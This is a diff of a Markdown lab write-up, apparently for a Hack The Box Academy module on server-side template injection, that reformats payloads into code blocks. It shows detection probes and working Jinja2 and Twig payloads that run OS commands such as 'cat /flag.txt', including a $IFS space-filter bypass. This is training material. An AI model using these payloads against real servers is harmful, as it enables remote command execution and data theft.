@@ -239,7 +239,11 @@ ${7*7}
 
 
 It didn't work, so we follow the chart in the section's guide and try the payload:
+{% raw %}
+```text
 {{7*7}}
+```
+{% endraw %}
 
 ![Figure 6.1 — Lab execution and output verification (Page 6)](/assets/images/posts/htb-academy/server-side-attacks/p006_01.jpg)
 *_Figure 6.1 — Lab execution and output verification (Page 6)_*
@@ -252,7 +256,11 @@ It didn't work, so we follow the chart in the section's guide and try the payloa
 ### * the chart for reference
 
 We get 49, so we need to proceed further and we will enter the payload:
+{% raw %}
+```text
 {{7*'7'}}
+```
+{% endraw %}
 
 
 And observe the output – if it's '7777777' -its 'Jinja' , if its '49' – it's Twig:
@@ -291,9 +299,11 @@ http://<Target-IP>:<target-port>
 
 and exploit Jinja SSTI ('Server-side Template Injection') to obtain RCE to get the
 flag:
-{{
-self.__init__.__globals__.__builtins__.__import__('os').pope
-n('cat flag.txt').read() }}
+{% raw %}
+```text
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
+```
+{% endraw %}
 
 ![Figure 8.1 — Lab execution and output verification (Page 8)](/assets/images/posts/htb-academy/server-side-attacks/p008_01.jpg)
 *_Figure 8.1 — Lab execution and output verification (Page 8)_*
@@ -314,7 +324,11 @@ n('cat flag.txt').read() }}
 
 same procedure as Jinja counterpart – except this time we run the
 command:
+{% raw %}
+```text
 {{ ['cat /flag.txt'] | filter('system') }}
+```
+{% endraw %}
 
 
 →
@@ -421,17 +435,24 @@ a path to some other URL, which has his own parameter 'id' with its own value
 ### Using burpsuite repeater
 
 We will now proceed with SSTI attack and set the 'id' value to:
-${7*7}
+`${7*7}`
 Using burpsuite repeater:
 
 Value not changed. Let's proceed with:
+{% raw %}
+```text
 {{7*7}}
-
+```
+{% endraw %}
 
 Value is now '49', indicating SSTI vulnerability.
 
 We will proceed to determine the SSTI type with the payload:
+{% raw %}
+```text
 {{7*'7'}}
+```
+{% endraw %}
 
 ![Figure 14.1 — Lab execution and output verification (Page 14)](/assets/images/posts/htb-academy/server-side-attacks/p014_01.jpg)
 *_Figure 14.1 — Lab execution and output verification (Page 14)_*
@@ -448,7 +469,11 @@ As the value remains '49' – its twig SSTI.
 We will proceed to inject the twig SSTI payload, with the removal of spaces,
 and in the command 'cat /flag.txt' – we will replace the space with linux
 'special space' – '$IFS' (the server won't accept spaces, bypass is required):
+{% raw %}
+```text
 {{['cat${IFS}/flag.txt']|filter('system')}}
+```
+{% endraw %}
 
 ![Figure 15.1 — Lab execution and output verification (Page 15)](/assets/images/posts/htb-academy/server-side-attacks/p015_01.jpg)
 *_Figure 15.1 — Lab execution and output verification (Page 15)_*
